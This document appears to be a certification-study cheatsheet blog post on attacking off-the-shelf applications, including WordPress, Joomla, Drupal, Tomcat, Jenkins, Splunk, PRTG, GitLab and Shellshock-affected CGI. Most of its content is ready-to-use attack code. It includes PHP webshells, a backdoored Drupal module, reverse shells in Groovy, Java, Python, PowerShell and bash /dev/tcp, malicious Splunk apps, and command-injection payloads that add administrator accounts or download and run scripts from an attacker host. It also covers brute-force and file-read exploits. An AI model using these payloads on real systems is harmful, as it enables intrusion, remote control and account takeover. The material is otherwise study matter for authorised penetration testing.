---
title: "CWES Cheatsheet — Attacking Common Applications"
date: 2026-03-09
categories: [Certifications, CWES]
tags: [cwes, cheatsheet, cms, wordpress, common-applications]
---

{% raw %}

a lot of targets run off-the-shelf software: WordPress, Joomla, Jenkins, Tomcat, etc. knowing the common attack vectors for these saves a ton of time. this covers discovery, enumeration, and exploitation for the most common applications you'll encounter.

---

## Application Categories

| Category | Applications |
|---|---|
| Web Content Management | Joomla, Drupal, WordPress, DotNetNuke |
| Application Servers | Apache Tomcat, Phusion Passenger, Oracle WebLogic, IBM WebSphere |
| SIEM | Splunk, Trustwave, LogRhythm |
| Network Management | PRTG Network Monitor, ManageEngine OpManager |
| IT Management | Nagios, Puppet, Zabbix, ManageEngine ServiceDesk Plus |
| Software Frameworks | JBoss, Axis2 |
| Customer Service Management | osTicket, Zendesk |
| Search Engines | Elasticsearch, Apache Solr |
| Software Configuration Management | Atlassian JIRA, GitHub, GitLab, Bugzilla, Bitbucket |
| Software Development Tools | Jenkins, Atlassian Confluence, phpMyAdmin |

---

## Application Discovery & Enumeration

```bash
# nmap web discovery scan
nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list

# eyewitness screenshot scan
eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness

# aquatone
cat web_discovery.xml | ./aquatone -nmap
```

---

# 1 - Content Management Systems (CMS)

---

## WordPress

### Discovery/Footprinting

a quick way to identify a WordPress site is by browsing to `/robots.txt` and looking for `/wp-admin` and `/wp-content` directories. attempting to browse to `wp-admin` will redirect to `wp-login.php`.

```bash
# detect WordPress and version
curl -s http://TARGET/ | grep WordPress
curl -s http://TARGET/ | grep generator

# enumerate themes and plugins from source
curl -s http://TARGET/ | grep themes
curl -s http://TARGET/ | grep plugins

# plugin version from readme
curl -s http://TARGET/wp-content/plugins/<plugin-name>/readme.txt
```

**wordpress user types:**

1. **Administrator** - access to administrative features, adding/deleting users and posts, editing source code
2. **Editor** - can publish and manage posts including other users' posts
3. **Author** - can publish and manage their own posts
4. **Contributor** - can write and manage own posts but cannot publish
5. **Subscriber** - standard users who can browse posts and edit their profiles

### WPScan

```bash
# full enum
wpscan --url http://TARGET/ --enumerate

# enumerate users + plugins + themes
wpscan --url http://TARGET/ --enumerate u,ap,at

# brute force login (xmlrpc method)
wpscan --password-attack xmlrpc -t 20 -U admin -P /usr/share/wordlists/rockyou.txt --url http://TARGET

# with API token for vuln data
wpscan --url http://TARGET/ --api-token <token>
```

### Code Execution (Admin Access)

```
1. log in to /wp-admin
2. Appearance -> Theme Editor
3. select a theme -> edit an unused file (e.g. 404.php)
4. add PHP one-liner: system($_GET['cmd']);
5. save -> access at /wp-content/themes/<theme>/404.php?cmd=id
```

```bash
# verify RCE
curl http://TARGET/wp-content/themes/twentynineteen/404.php?0=id
```

### Metasploit

```bash
use exploit/unix/webapp/wp_admin_shell_upload
set USERNAME admin
set PASSWORD <pass>
set RHOSTS <target>
set VHOST <vhost>
exploit
```

### Leveraging Known Vulnerabilities

vulnerability breakdown for WordPress:

```
- 89% of WP vulns are in plugins
- 7% in themes
- 4% in WP core
- always check plugin versions vs known CVEs
```

> use the waybackurls tool to look for older versions of a target site using the Wayback Machine. sometimes we may find a previous version of a WordPress site using a plugin that has a known vulnerability.

**example - mail-masta plugin (LFI):**

```bash
# the pl parameter allows arbitrary file inclusion
curl -s http://TARGET/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

**example - wpDiscuz 7.0.4 (CVE-2020-24186 - file upload bypass RCE):**

```bash
python3 wp_discuz.py -u http://TARGET -p /?p=1

# after exploit uploads webshell:
curl -s http://TARGET/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id
```

---

## Joomla

### Discovery/Footprinting

```bash
# detect Joomla
curl -s http://TARGET/ | grep Joomla

# version from README
curl -s http://TARGET/README.txt | head -5

# version from manifest XML
curl -s http://TARGET/administrator/manifests/files/joomla.xml | xmllint --format -

# robots.txt often reveals Joomla structure
curl -s http://TARGET/robots.txt
```

other places to check for version info: `plugins/system/cache/cache.xml`, `media/system/js/` JavaScript files.

### Enumeration Tools

```bash
# droopescan
droopescan scan joomla --url http://TARGET/

# JoomlaScan
python2.7 joomlascan.py -u http://TARGET/

# brute force admin
python3 joomla-brute.py -u http://TARGET/ -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```

### Code Execution (Admin Access)

```
1. log in to /administrator
2. Extensions -> Templates -> Templates
3. select template (e.g. protostar) -> edit error.php
4. add: system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
5. curl http://TARGET/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
```

> use a non-standard parameter name (like an md5 hash) instead of `cmd` to prevent drive-by attackers from finding your webshell during the assessment.

### CVE-2019-10945 - Directory Traversal (Joomla 1.5-3.9.4)

```bash
python2.7 joomla_dir_trav.py --url "http://TARGET/administrator/" --username admin --password admin --dir /
```

---

## Drupal

### Discovery/Footprinting

```bash
# detect Drupal
curl -s http://TARGET/ | grep Drupal

# version from CHANGELOG (older installs)
curl -s http://TARGET/CHANGELOG.txt | grep -m2 ""

# droopescan
droopescan scan drupal -u http://TARGET/

# nodes as indicator
# http://TARGET/node/1
```

drupal supports three default user types: **Administrator** (complete control), **Authenticated User** (log in, add/edit articles based on permissions), **Anonymous** (read posts only).

### Code Execution (Admin Access)

**PHP Filter Module:**

```
Drupal < 8:  PHP Filter module built-in -> enable it
Drupal 8+:   Download php-8.x-1.1.tar.gz -> install manually

steps:
1. enable PHP Filter module
2. Content -> Add content -> Basic page
3. insert PHP code: <?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); ?>
4. set Text format to "PHP code"
5. access at /node/<id>?dcfdd5e021a869fcc6dfaef8bf31377e=id
```

### Backdoored Module Upload

```bash
# download a legit module, add shell.php + .htaccess, repackage
wget https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz

# create shell.php:
# <?php system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']); ?>

# create .htaccess:
# <IfModule mod_rewrite.c>
# RewriteEngine On
# RewriteBase /
# </IfModule>

mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/

# upload at: /admin/modules/install
# access: /modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```

### Drupalgeddon CVEs

| CVE | Versions | Auth | Type |
|---|---|---|---|
| CVE-2014-3704 (Drupalgeddon 1) | 7.0-7.31 | No | SQLi -> admin creation |
| CVE-2018-7600 (Drupalgeddon 2) | <7.58 / <8.5.1 | No | Direct RCE |
| CVE-2018-7602 (Drupalgeddon 3) | 7.x / 8.x | Yes | RCE via Form API |

```bash
# drupalgeddon 1
python2.7 drupalgeddon.py -t http://target.com -u hacker -p pwnd

# drupalgeddon 2
python3 drupalgeddon2.py
# enter target URL -> uploads test file, confirm RCE, modify for shell upload

# drupalgeddon 3 (requires auth + session cookie)
# use Metasploit: exploit/multi/http/drupal_drupageddon3
```

---

# 2 - Servlet Containers / Software Development

---

## Tomcat

### Discovery/Footprinting

```bash
# version from error page or /docs
curl -s http://TARGET:8080/invalid
curl -s http://TARGET:8080/docs/ | grep Tomcat
```

### Key Files

```
conf/tomcat-users.xml    -> credentials + roles for /manager
webapps/manager/         -> upload WAR files here = RCE
conf/web.xml             -> global deployment descriptor
WEB-INF/web.xml          -> per-app routes and class mappings
```

**tomcat-users.xml roles:**

- `manager-gui` - access to HTML GUI and status pages
- `manager-script` - access to HTTP API and status pages
- `manager-jmx` - access to JMX proxy and status pages
- `manager-status` - access to status pages only

### Login Brute Force

```bash
# Metasploit
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS <target>
set RPORT 8080
set STOP_ON_SUCCESS true
run

# default creds to try
# tomcat:tomcat, admin:admin, tomcat:s3cret, tomcat:admin
```

### WAR File Upload (RCE)

```bash
# create JSP webshell + WAR
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp

# upload via /manager/html -> Deploy WAR
# access: http://TARGET:8080/backup/cmd.jsp?cmd=id

# verify
curl http://TARGET:8080/backup/cmd.jsp?cmd=id
```

```bash
# msfvenom WAR payload
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker> LPORT=4443 -f war > backup.war

# start listener
nc -lnvp 4443

# upload WAR, click /backup to trigger shell
```

```bash
# Metasploit automated
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS <target>
set RPORT 8080
exploit
```

> when uploading web shells (especially on externals), use a randomized file name (md5 hash), limit access to your source IP, and consider password protecting it. don't leave a door open for drive-by attackers.

### Ghostcat (CVE-2020-1938) - Unauthenticated LFI

```bash
# affects Tomcat < 9.0.31, 8.5.51, 7.0.100
# AJP service on port 8009
nmap -sV -p 8009,8080 <target>

python2.7 tomcat-ajp.lfi.py <target> -p 8009 -f WEB-INF/web.xml
```

> the exploit can only read files within the web apps folder. files like `/etc/passwd` can't be accessed, but `WEB-INF/web.xml` and other app files are fair game.

### Tomcat CGI (CVE-2019-0232) - Windows RCE

affects Tomcat 9.0.0.M1-9.0.17, 8.5.0-8.5.39, 7.0.0-7.0.93 when `enableCmdLineArguments` is enabled on Windows.

```bash
# fuzz for CGI scripts
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://TARGET:8080/cgi/FUZZ.bat
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://TARGET:8080/cgi/FUZZ.cmd

# basic injection
http://TARGET:8080/cgi/welcome.bat?&dir

# URL-encoded to bypass filters
http://TARGET:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```

---

## Jenkins

### Discovery

```
- default port: 8080
- slave communication: 5000
- auth methods: local DB, LDAP, Unix, none
- if account registration enabled -> create your own account
```

| Auth Method | What it means |
|---|---|
| Local database | Jenkins stores usernames/passwords itself |
| LDAP | Uses Active Directory / LDAP for login |
| Unix user database | Uses Linux /etc/passwd accounts |
| Delegate to servlet container | Let Tomcat handle authentication |
| No authentication | Anyone can access everything |

### Script Console RCE (Admin Access)

access at `/script` - Groovy script console.

```groovy
// Linux command execution
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

```groovy
// reverse shell (Linux)
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<attacker>/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

```groovy
// Windows - quick recon
def cmd = "cmd.exe /c whoami".execute();
println("${cmd.text}");
```

### Metasploit

```bash
use exploit/multi/http/jenkins_script_console
set RHOSTS <target>
set RPORT 8080
set USERNAME admin
set PASSWORD admin
set LHOST <attacker>
exploit
```

### Against Windows

**option 1 - add user + RDP/WinRM (noisy):**

```groovy
// create user
def cmd = "cmd.exe /c net user hacker Pass123! /add".execute();
println("${cmd.text}");

// add to admins
def cmd = "cmd.exe /c net localgroup Administrators hacker /add".execute();
println("${cmd.text}");
```

```bash
# connect
xfreerdp /u:hacker /p:'Pass123!' /v:TARGET_IP
evil-winrm -i TARGET_IP -u hacker -p 'Pass123!'
```

**option 2 - PowerShell download cradle (stealthy):**

```bash
# download Invoke-PowerShellTcp.ps1 from nishang
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1

# add auto-execute line at bottom
echo 'Invoke-PowerShellTcp -Reverse -IPAddress YOUR_IP -Port 4444' >> Invoke-PowerShellTcp.ps1

# host the script
python3 -m http.server 8080

# start listener
nc -lvnp 4444
```

then run in Jenkins Script Console:

```groovy
def cmd = "powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP:8080/Invoke-PowerShellTcp.ps1')".execute();
println("${cmd.text}");
```

**option 3 - Java reverse shell:**

```groovy
String host="YOUR_IP";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

### Jenkins CVEs

```
Jenkins 2.137   -> Pre-auth RCE (CVE-2018-1999002 + CVE-2019-1003000)
Jenkins 2.150.2 -> Auth RCE via Node.js (no-auth if anonymous enabled)
Jenkins 2.303.1+-> Both patched

# check version: http://TARGET:8080/oops
```

---

# 3 - Infrastructure / Network Monitoring

---

## Splunk

### Discovery

```
- default port: 8000 (web), 8089 (REST API)
- default creds (older): admin:changeme
- runs as root (Linux) or SYSTEM (Windows)
```

```bash
# check version via REST API
curl -k https://TARGET:8089/services | grep "build"
```

> Splunk Enterprise trial converts to Free version after 60 days. free version has no authentication required. common in environments where admins forget about trial installations.

### RCE via Custom App

splunk allows custom apps to run Python, Batch, Bash, or PowerShell scripts. splunk comes with Python installed. upload a malicious app to get RCE.

**directory structure:**

```
splunk_shell/
├── bin/
│   ├── rev.py      # Linux
│   ├── run.bat     # Windows launcher
│   └── run.ps1     # Windows reverse shell
└── default/
    └── inputs.conf
```

**Linux - rev.py:**

```python
import sys,socket,os,pty

ip="ATTACKER_IP"
port="PORT"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```

**Linux - inputs.conf:**

```
[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = shell
```

**Windows - run.ps1:**

```powershell
$client = New-Object System.Net.Sockets.TCPClient('attacker_ip_here',attacker_port_here);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

**Windows - run.bat:**

```batch
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
```

**Windows - inputs.conf:**

```
[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```

```bash
# package and upload
tar -cvzf updater.tar.gz splunk_shell/

# start listener
sudo nc -lnvp PORT

# upload at: https://TARGET:8000/en-US/manager/search/apps/local
# choose "Install app from file"
```

> if the compromised Splunk host is a Deployment Server, you can push malicious apps to all hosts with Universal Forwarders. note: Universal Forwarders don't have Python installed, so on Windows you must use PowerShell.

---

## PRTG Network Monitor

```
- default creds: prtgadmin:prtgadmin
- port: 8080
- agentless network monitoring
```

### CVE-2018-9276 - Authenticated Command Injection (< 18.2.39)

inject commands into notification scripts via the Parameter field.

**steps:**

```
1. login
2. Setup -> Account Settings -> Notifications
3. Add new notification
4. tick EXECUTE PROGRAM
5. select "Demo exe notification - outfile.ps1"
6. enter payload in Parameter field
7. save and test
```

**payload examples:**

| Goal | Payload |
|---|---|
| Add admin user | `test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add` |
| Reverse shell | `test.txt;powershell -e <BASE64_SHELL>` |
| Download & execute | `test.txt;powershell IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/shell.ps1')` |
| Ping back (test) | `test.txt;ping YOUR_IP` |

> this is blind command execution - no output visible. verify with crackmapexec, evil-winrm, or check your listener.

```bash
# verify the user was created
crackmapexec smb TARGET -u prtgadm1 -p 'Pwn3d_by_PRTG!'

# connect
evil-winrm -i TARGET -u prtgadm1 -p 'Pwn3d_by_PRTG!'
```

---

# 4 - Customer Service & Configuration Management

---

## osTicket

open-source support ticketing system (PHP + MySQL). often overlooked during assessments but can contain sensitive customer data, credentials in tickets, and internal system information.

### The Email Trick

support portals can be abused to obtain a company email address, which can then be used to sign up for other exposed applications requiring email verification.

**attack flow:**

```
1. find GitLab/Slack requiring company email to register
2. submit ticket to osTicket -> get temp email: 940288@inlanefreight.local
3. register on GitLab with the temp email
4. confirmation email appears in osTicket ticket
5. click confirmation link -> access GitLab
```

> even if the application itself isn't directly exploitable, understanding how it works can give you access to other services.

---

## GitLab

web-based Git repository hosting (Ruby on Rails, Go, Vue.js). repositories often contain hardcoded credentials, config files with secrets, SSH private keys, and API keys.

### Enumeration

```
- browse /explore for public projects
- try to register an account (2FA disabled by default)
- username enumeration via registration form: "Username is already taken"
- email enumeration: "Email has already been taken"
- version at /help (requires login)
```

**search for sensitive data:**

```
password, secret, api_key, token, private_key, .env files, config files
also check commit history - removed secrets may still exist
```

### Known Vulnerable Versions

| Version | Notes |
|---|---|
| 12.9.0 | Serious exploit |
| 11.4.7 | Serious exploit |
| CE 13.10.3 | Community Edition exploit |
| CE 13.9.3 | Community Edition exploit |
| CE 13.10.2 | Community Edition RCE |

```bash
# authenticated RCE against GitLab CE 13.10.2
python3 gitlab_13_10_2_rce.py -t http://TARGET:8081 -u mrb3n -p password1 \
  -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER_IP 8443 >/tmp/f'
```

> gitLab defaults: 10 failed login attempts results in automatic lock, unlock after 10 minutes. be mindful during brute forcing.

---

# 5 - Common Gateway Interfaces

---

## Shellshock (CVE-2014-6271)

vulnerability in old versions of Bash (4.3 and below). allows executing arbitrary commands via malicious environment variables through CGI scripts.

```bash
# hunt for CGI scripts
gobuster dir -u http://TARGET/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi

# confirm vulnerability
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://TARGET/cgi-bin/access.cgi

# reverse shell
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/ATTACKER_IP/7777 0>&1' http://TARGET/cgi-bin/access.cgi
```

---

# 6 - Miscellaneous Applications

---

## ColdFusion

ColdFusion uses `.cfm` and `.cfc` file extensions. default port is 8500 (SSL). admin panel at `/CFIDE/administrator/index.cfm`.

**enumeration:**

```bash
# port scan
nmap -p- -sC -Pn TARGET --open

# look for port 8500, /CFIDE and /cfdocs directories
# admin page: /CFIDE/administrator/
```

```bash
# search for known exploits
searchsploit adobe coldfusion

# ColdFusion 8 - Remote Command Execution
# ColdFusion 9 - Administrative Authentication Bypass
# ColdFusion < 11 Update 10 - XXE Injection
```

---

[← Back to CWES Cheatsheet Index](/posts/cwes-cheatsheet/)

{% endraw %}
